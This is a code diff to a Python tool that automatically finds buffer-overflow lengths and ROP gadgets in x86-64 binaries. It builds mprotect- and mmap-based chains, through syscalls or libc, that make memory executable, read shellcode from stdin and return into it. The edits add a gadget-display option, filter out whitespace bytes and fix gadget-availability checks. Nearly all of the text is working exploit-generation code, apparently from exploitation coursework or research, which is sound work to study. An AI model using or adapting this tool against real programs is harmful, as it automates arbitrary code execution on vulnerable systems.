@@ -47,7 +47,6 @@ gadget_map = {}
 has_libc = True
 libc_addr = None
 buflen = 0
-#bufaddr = None
 mprotect_addr = None
 mmap_addr = None
 memcpy_addr = None
@@ -56,6 +55,7 @@ verbose = False
 disable_exec = False
 disable_file_output = False
 target_ropchain = None
+display_gadgets = False
 
 
 # pretty colors
@@ -104,52 +104,12 @@ def find_buffer_length(f):
     return len(buf)
 
 
-# Determines the address of the buffer
-#def find_buffer_addr(f):
-#    # since ASLR is disabled, we should be able to write a small program
-#    # using the known information about the size/length of the buffer
-#    # before it overflows, then print out that addr for the buffer
-#    # in a dummy program
-#    try:
-#        buf_addr_prog = open("./find-vuln-buf.c", "w+")
-#        buf_addr_prog.write(
-#                "#include <stdio.h>\n" +
-#                "#include <string.h>\n" +
-#                "\n" +
-#                "int main(int argc, char *argv[])\n" +
-#                "{\n" +
-#                f"    char buf[{buflen-8}];\n" +
-#                "    printf(\"%p\", buf);\n" +
-#                "    return 0;\n" +
-#                "}")
-#        buf_addr_prog.close()
-#        
-#        gcc = subprocess.Popen(["gcc", "-fno-stack-protector", "-g", "-o", "find-vuln-buf", "find-vuln-buf.c"], stdout=PIPE, stderr=PIPE)
-#        try:
-#            stdout, stderr = gcc.communicate(timeout=5)
-#        except TimeoutExpired:
-#            gcc.kill()
-#            stdout, stderr = gcc.communicate()
-#
-#        bufproc = subprocess.Popen(["./find-vuln-buf"], stdout=PIPE, stderr=PIPE)
-#        bufaddr = None
-#        try:
-#            stdout, stderr = bufproc.communicate(timeout=5)
-#            bufaddr = stdout
-#        except TimeoutExpired:
-#            bufproc.kill()
-#
-#        subprocess.Popen(["rm", "-rf", "find-vuln-buf.c", "find-vuln-buf"])
-#        return bufaddr
-#
-#    except Exception as err:
-#        print(f"{Colors.BOLD}{Colors.RED}Failed to write file: {err}{Colors.GREY}{Colors.RESET}")
-#        return None
-
-
-# Small helper function to print a gadget in human-readable format
+# Small helper function to pretty-print a gadget in human-readable format
 def print_gadget(g, g_addr):
-    if verbose == 0:
+    global verbose
+    global display_gadgets
+
+    if display_gadgets is False:
         return
 
     md = Cs(CS_ARCH_X86, CS_MODE_64)
@@ -208,22 +168,32 @@ def build_gadgets(elfname, baseaddr):
             
         # check if the gadgets found are unique, and add them to the global map if so
         for g_addr in gadgets:
-            #if b'\x0a' in bytes(g_addr) or b'\x0d' in bytes(g_addr):
-            #    print(f"rejecting {g_addr} due to bad bytes")
-            #    continue
-
-            # does the address of the gadget contain 0x0a or 0x0d?
-            
-            #if ~g_addr ^ 0x0a == 0x0a or ~g_addr ^ 0x0a00 == 0x0a00 or ~g_addr ^ 0x0a0000 == 0x0a0000 or ~g_addr ^ 0x0a000000 == 0x0a000000:
+            # does the address of the gadget contain any bytes that would be interpretted as whitespace?
             s_addr = g_addr.to_bytes(8, byteorder='little', signed=False)
+            if b'\x09' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x09{Colors.GREY} byte")
+                continue
+
             if b'\x0a' in s_addr:
                 debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0a{Colors.GREY} byte")
                 continue
 
-            #if ~g_addr ^ 0x0d == 0x0d or ~g_addr ^ 0x0d00 == 0x0d00 or ~g_addr ^ 0x0d0000 == 0x0d0000 or ~g_addr ^ 0x0d000000 == 0x0d000000:
+            if b'\x0b' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0b{Colors.GREY} byte")
+                continue
+
+            if b'\x0c' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0c{Colors.GREY} byte")
+                continue
+
             if b'\x0d' in s_addr:
                 debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x0d{Colors.GREY} byte")
                 continue
+
+            if b'\x20' in s_addr:
+                debug(f"rejecting {hex(g_addr)} due to {Colors.YELLOW}0x20{Colors.GREY} byte")
+                continue
+
 
             if gadgets[g_addr] not in gadget_map.values():
                 md = Cs(CS_ARCH_X86, CS_MODE_64)
@@ -584,22 +554,22 @@ def build_syscall_mmap(f):
 
     ret = find_ret()
 
-    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or \
+    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and (pop_r12_pr is None or mov_rdx_r12_ppr is None)) or \
             (pop_r10 is None) or (pop_r8 is None) or (pop_r9 is None) or (xchg_rax_r12 is None) or (xor_rax_rax is None) or (mov_from_r12 is None) or \
             (ret is None) or (add_rax_1 is None):
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
-    payload  = b'A' * buflen        # padding
+    payload  = b'A' * buflen            # padding
 
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(add_rax_1) * 9      # rax = 9
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(add_rax_1) * 9       # rax = 9
 
     # First the mmap call
-    payload += p64(pop_rdi)         # 1st arg
-    payload += p64(0x0)             # 0
-    payload += p64(pop_rsi)         # 2nd arg
-    payload += p64(0x1000)          # 4kb (pagesize)
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # 0
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(0x1000)              # 4kb (pagesize)
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x7)
@@ -608,37 +578,37 @@ def build_syscall_mmap(f):
         payload += p64(0x7)             # R|W|X
         payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
         payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
-        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
-        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(pop_r10)         # 4th arg
-    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
-    payload += p64(pop_r8)          # 5th arg
-    payload += p64(0xffffffffffffffff)      # -1
-    payload += p64(pop_r9)          # 6th arg
-    payload += p64(0x0)             # 0
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(pop_r10)             # 4th arg
+    payload += p64(0x21)                # MAP_SHARED | MAP_ANONYMOUS
+    payload += p64(pop_r8)              # 5th arg
+    payload += p64(0xffffffffffffffff)  # -1
+    payload += p64(pop_r9)              # 6th arg
+    payload += p64(0x0)                 # 0
     payload += p64(syscall)
 
     # save rax for later
     payload += p64(xchg_rax_r12)
 
     # Then the read call
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(0x0)                # fd0 (stdin)
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # fd0 (stdin)
     payload += p64(mov_from_r12)
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(PLACEHOLDER)        # address to write into
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(PLACEHOLDER)         # address to write into
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x1000)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 4kb
-        payload += p64(0x1000)             # 4kb
-        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
-        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(syscall)            # syscall
+        payload += p64(pop_r12_pr)      # r12 = 4kb
+        payload += p64(0x1000)          # 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)             # syscall
 
     # Then return into the new RWX page
     payload += p64(mov_from_r12)
@@ -689,19 +659,19 @@ def build_libc_mmap(f):
 
     ret = find_ret()
 
-    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or \
+    if (syscall is None) or (pop_rdi is None) or (pop_rsi is None) or (pop_rdx is None and (pop_r12_pr is None or mov_rdx_r12_ppr is None)) or \
             (pop_r10 is None) or (pop_r8 is None) or (pop_r9 is None) or (xchg_rax_r12 is None) or (xor_rax_rax is None) or (mov_from_r12 is None) or \
             (ret is None) or (pop_rcx is None) or (add_rax_1 is None):
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
-    payload  = b'A' * buflen        # padding
+    payload  = b'A' * buflen            # padding
 
     # First the mmap call
-    payload += p64(pop_rdi)         # 1st arg
-    payload += p64(0x0)             # 0
-    payload += p64(pop_rsi)         # 2nd arg
-    payload += p64(0x1000)          # 4kb (pagesize)
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # 0
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(0x1000)              # 4kb (pagesize)
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x7)
@@ -710,39 +680,39 @@ def build_libc_mmap(f):
         payload += p64(0x7)             # R|W|X
         payload += p64(PLACEHOLDER)     # for 2nd pop in pop_r12_pr
         payload += p64(mov_rdx_r12_ppr) # 3rd arg, rdx = 0x7
-        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
-        payload += p64(PLACEHOLDER)    # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(pop_r10)         # 4th arg
-    payload += p64(0x21)            # MAP_SHARED | MAP_ANONYMOUS
-    payload += p64(pop_rcx)         # why does glibc's mmap move rcx->r10? so weird.
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(pop_r10)             # 4th arg
+    payload += p64(0x21)                # MAP_SHARED | MAP_ANONYMOUS
+    payload += p64(pop_rcx)             # why does glibc's mmap move rcx->r10? so weird.
     payload += p64(0x21)
-    payload += p64(pop_r8)          # 5th arg
-    payload += p64(0xffffffffffffffff)      # -1
-    payload += p64(pop_r9)          # 6th arg
-    payload += p64(0x0)             # 0
+    payload += p64(pop_r8)              # 5th arg
+    payload += p64(0xffffffffffffffff)  # -1
+    payload += p64(pop_r9)              # 6th arg
+    payload += p64(0x0)                 # 0
     payload += p64(mmap_addr)
 
     # save rax for later
     payload += p64(xchg_rax_r12)
 
     # Then the read call
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(0x0)                # fd0 (stdin)
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # fd0 (stdin)
     payload += p64(mov_from_r12)
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(PLACEHOLDER)        # address to write into
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(PLACEHOLDER)         # address to write into
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x1000)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 4kb
-        payload += p64(0x1000)             # 4kb
-        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
-        payload += p64(PLACEHOLDER)   # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(syscall)            # syscall
+        payload += p64(pop_r12_pr)      # r12 = 4kb
+        payload += p64(0x1000)          # 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+        payload += p64(PLACEHOLDER)     # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)             # syscall
 
     # Then return into the new RWX page
     payload += p64(mov_from_r12)
@@ -775,49 +745,49 @@ def build_syscall_mprotect(f):
     add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number
 
     if (xor_rax_rax is None) or (add_rax_1 is None) or (pop_rdi is None) or (sc_addr is None) or (pop_rsi is None) or \
-            (pop_rdx is None and pop_r12_pr is None and mov_rdx_r12_ppr is None) or (syscall is None) or (pop_rdx is None):
+            (pop_rdx is None and (pop_r12_pr is None or mov_rdx_r12_ppr is None)) or (syscall is None):
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
-    payload = b'A' * buflen                 # padding
+    payload = b'A' * buflen             # padding
 
     # first the mprotect call to set up the area
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(add_rax_1) * 10     # rax = 10
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(sc_addr)            # address we want to make r/w/x
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(0x1000)             # 4kb (pagesize)
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(add_rax_1) * 10      # rax = 10
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(sc_addr)             # address we want to make r/w/x
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(0x1000)              # 4kb (pagesize)
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x7)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 7
-        payload += p64(0x7)                # R|W|X
-        payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
-        payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
-    payload += p64(syscall)            # syscall
+        payload += p64(pop_r12_pr)      # r12 = 7
+        payload += p64(0x7)             # R|W|X
+        payload += p64(PLACEHOLDER)     # needed because pop_r12_pr has an extra pop in it
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 7
+        payload += p64(PLACEHOLDER) * 2 # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    payload += p64(syscall)             # syscall
 
     # second, we use a read() call to read the shellcode into the buffer
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(0x0)                # fd0 (stdin)
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(sc_addr)            # address to write into
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # fd0 (stdin)
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(sc_addr)             # address to write into
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x1000)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 4kb
-        payload += p64(0x1000)             # 4kb
-        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-        payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(syscall)            # syscall
+        payload += p64(pop_r12_pr)      # r12 = 4kb
+        payload += p64(0x1000)          # 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER) * 2 # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)             # syscall
 
     # finally, return into the RWX page containing the shellcode
-    payload += p64(sc_addr)            # return into the read shellcode
+    payload += p64(sc_addr)             # return into the read shellcode
 
     return payload
 
@@ -853,49 +823,50 @@ def build_libc_mprotect(f):
     xor_rax_rax = find_xor_rax_rax_ret() # rax = 0
     add_rax_1 = find_add_rax_1_ret()     # used to increment rax to the correct syscall number
 
-    if syscall is None or pop_rax is None or pop_rdi is None or pop_rsi is None or pop_r12_pr is None or (mov_rdx_r12_ppr is None and pop_rdx is None) or xor_rax_rax is None or add_rax_1 is None:
+    if (syscall is None) or (pop_rax is None) or (pop_rdi is None) or (pop_rsi is None) or \
+            ((pop_r12_pr is None or mov_rdx_r12_ppr is None) and pop_rdx is None) or xor_rax_rax is None or add_rax_1 is None:
         print(f"{Colors.BOLD}{Colors.RED}Insufficient gadgets found for this chain!{Colors.GREY}{Colors.RESET}")
         return None
 
-    payload = b'A' * buflen            # padding
+    payload = b'A' * buflen             # padding
 
     # first the mprotect call to set up the area
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(add_rax_1) * 10     # rax = 10
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(sc_addr)            # address we want to make r/w/x
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(0x1000)             # 4kb (pagesize)
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(add_rax_1) * 10      # rax = 10
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(sc_addr)             # address we want to make r/w/x
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(0x1000)              # 4kb (pagesize)
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x7)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 7
-        payload += p64(0x7)                # R|W|X
-        payload += p64(PLACEHOLDER)        # needed because pop_r12_pr has an extra pop in it
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 7
-        payload += p64(PLACEHOLDER) * 2    # needed because mov_rdx_r12_ppr has 2 extra pops in it
-    payload += p64(mprotect_addr)      # mprotect()
+        payload += p64(pop_r12_pr)      # r12 = 7
+        payload += p64(0x7)             # R|W|X
+        payload += p64(PLACEHOLDER)     # needed because pop_r12_pr has an extra pop in it
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 7
+        payload += p64(PLACEHOLDER) * 2 # needed because mov_rdx_r12_ppr has 2 extra pops in it
+    payload += p64(mprotect_addr)       # mprotect()
 
     # second, we use a read() call to read the shellcode into the buffer
-    payload += p64(xor_rax_rax)        # rax = 0
-    payload += p64(pop_rdi)            # 1st arg
-    payload += p64(0x0)                # fd0 (stdin)
-    payload += p64(pop_rsi)            # 2nd arg
-    payload += p64(sc_addr)            # address to write into
+    payload += p64(xor_rax_rax)         # rax = 0
+    payload += p64(pop_rdi)             # 1st arg
+    payload += p64(0x0)                 # fd0 (stdin)
+    payload += p64(pop_rsi)             # 2nd arg
+    payload += p64(sc_addr)             # address to write into
     if pop_rdx is not None:
         payload += p64(pop_rdx)
         payload += p64(0x1000)
     else:
-        payload += p64(pop_r12_pr)         # r12 = 4kb
-        payload += p64(0x1000)             # 4kb
-        payload += p64(PLACEHOLDER)        # needed for the extra pr in pop_r12_pr
-        payload += p64(mov_rdx_r12_ppr)    # rdx = r12 = 4kb
-        payload += p64(PLACEHOLDER) * 2    # needed for the extra ppr in mov_rdx_r12_ppr
-    payload += p64(syscall)            # syscall
+        payload += p64(pop_r12_pr)      # r12 = 4kb
+        payload += p64(0x1000)          # 4kb
+        payload += p64(PLACEHOLDER)     # needed for the extra pr in pop_r12_pr
+        payload += p64(mov_rdx_r12_ppr) # rdx = r12 = 4kb
+        payload += p64(PLACEHOLDER) * 2 # needed for the extra ppr in mov_rdx_r12_ppr
+    payload += p64(syscall)             # syscall
 
     # finally, return into the RWX page containing the shellcode
-    payload += p64(sc_addr)            # return into the read shellcode
+    payload += p64(sc_addr)             # return into the read shellcode
 
     return payload
 
@@ -906,7 +877,6 @@ def build_chain(filename):
     global has_libc
     global libc_addr
     global buflen
-    #global bufaddr
     global mprotect_addr
     global mmap_addr
     global memcpy_addr
@@ -919,7 +889,6 @@ def build_chain(filename):
     has_libc = True
     libc_addr = None
     buflen = 0
-    #bufaddr = None
     mprotect_addr = None
     sc_addr = None
 
@@ -928,8 +897,8 @@ def build_chain(filename):
     elf = ELF(filename, checksec=False)
 
     # What libraries is this linked against?
-    # Herein we look for libc so we can update the libc base address (req'd for the libc calls above)
-    # and also build the gadget list for each library
+    # Herein we look for libc so we can update the libc base address (req'd for the libc chains above)
+    # and also build the gadget list from each library
     for libname in elf.libs:
         debug(f"ELF linked against {libname} : {hex(elf.libs[libname])}")
 
@@ -938,11 +907,7 @@ def build_chain(filename):
                 if s.header.p_type == 'PT_LOAD' and s.header.p_flags == 6:
                     # ok, this should be a good spot.. needs to be page aligned, though
                     h = s.header
-                    addr = h.p_vaddr
-                    if addr % 4096 != 0:
-                        addr += 4096
-                        addr = addr // 4096
-                        addr *= 4096
+                    addr = ((h.p_vaddr >> 12) << 12)    # shift the lower 12 bytes out, which will make it an even multiple of 4k
                     sc_addr = elf.libs[libname] + addr
                     debug(f"targetting address for mprotect {hex(sc_addr)}")
 
@@ -968,12 +933,6 @@ def build_chain(filename):
         print(f"{Colors.BOLD}{Colors.YELLOW}{filename}{Colors.WHITE} does not appear to be vulnerable.")
         return None
     print(f"Target buffer overflows at {Colors.BOLD}{Colors.GREEN}{buflen}{Colors.RESET}{Colors.GREY} bytes")
-
-    # Determines the address of the buffer in memory
-    #bufaddr = find_buffer_addr(filename)
-    #if bufaddr is None:
-    #    print(f"{Colors.BOLD}{Colors.YELLOW}Unable to determine buffer address.{Colors.GREY}{Colors.RESET}")
-    #    return None
 
     # Try syscall-mprotect chain
     print(f"{Colors.BOLD}{Colors.GREY}Attempting {Colors.YELLOW}syscall-mprotect{Colors.GREY} chain...")
@@ -1081,6 +1040,7 @@ def build_chain(filename):
             except Exception as err:
                 print(f"{Colors.BOLD}*** {Colors.RED}ERROR: {err}")
 
+
 # Outputs the payload to a file, in raw format.
 # This can be examined w/ `xxd` later on, converted or encoded to
 # some other form, or fed as input to the executable.
@@ -1113,6 +1073,7 @@ ROP chain to build by combinging the -p option with one of the following:
         3 - mmap->read chain using system calls
         4 - mmap->read chain using libc calls'''))
     parser.add_argument('-v', action='store_true', help='enable verbose output')
+    parser.add_argument('-t', action='store_true', help='display gadgets')
     parser.add_argument('-x', action='store_true', help='do not attempt to launch process with ROP payload')
     parser.add_argument('-d', action='store_true', help='do not write generated payloads out as files')
     parser.add_argument('-p', nargs="?", help='specified which payload to build.')
@@ -1138,6 +1099,11 @@ ROP chain to build by combinging the -p option with one of the following:
         global target_ropchain
         target_ropchain = args.p
         debug(f"target_rop_chain: {target_ropchain}")
+
+    if args.t:
+        global display_gadgets
+        display_gadgets = args.t
+        debug(f"display_gadgets: True")
 
     if args.files:
         global files
